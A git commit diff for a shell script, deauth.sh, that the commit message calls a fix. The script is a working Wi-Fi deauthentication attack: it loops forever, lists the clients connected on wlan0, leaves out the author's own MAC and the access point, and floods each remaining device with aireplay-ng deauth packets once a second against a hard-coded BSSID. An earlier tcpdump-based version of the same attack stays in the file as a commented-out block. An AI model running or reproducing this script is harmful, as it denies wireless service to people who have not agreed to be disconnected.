949513e5e6aea099c456f9fff4d8e989789fcd41
JuSTinMrp <r4mp3nt3st3r619@gmail.com>
2024-03-22 19:27:58 +0530

    fixing_working

--- deauth.sh
+++ deauth.sh
@@ -1,13 +1,26 @@
+# #!/bin/bash
+
+# AP_BSSID="00:E6:3A:6E:D1:60"
+# MY_MAC="d0:c5:d3:77:a6:4d"
+
+# while true; do
+#     DEVICES=$(tcpdump -i -v wlan0 -c 100 -n -e | grep -o -E '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})' | grep -v "$MY_MAC" | sort -u)
+#     for DEVICE in $DEVICES; do
+#         echo "Sending deauth packets to $DEVICE"
+#         aireplay-ng --deauth 100 -a $AP_BSSID -c $DEVICE wlan0
+#     done
+#    sleep 1
+# done
+
+
 #!/bin/bash
 
-AP_BSSID="00:E6:3A:6E:D1:60"
-MY_MAC="d0:c5:d3:77:a6:4d"
+AP_BSSID=00:E6:3A:6E:D1:60
+MY_MAC=d0:c5:d3:77:a6:4d
 
 while true; do
-    DEVICES=$(tcpdump -i wlan0 -c 100 -n -e | grep -o -E '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})' | grep -v "$MY_MAC" | sort -u)
-    for DEVICE in $DEVICES; do
-        echo "Sending deauth packets to $DEVICE"
+    for DEVICE in $(iw dev wlan0 station dump | awk -F' ' '{print $2}' | grep -v "$MY_MAC" | grep -v "$AP_BSSID"); do
         aireplay-ng --deauth 100 -a $AP_BSSID -c $DEVICE wlan0
     done
-    sleep 10
+    sleep 1
 done
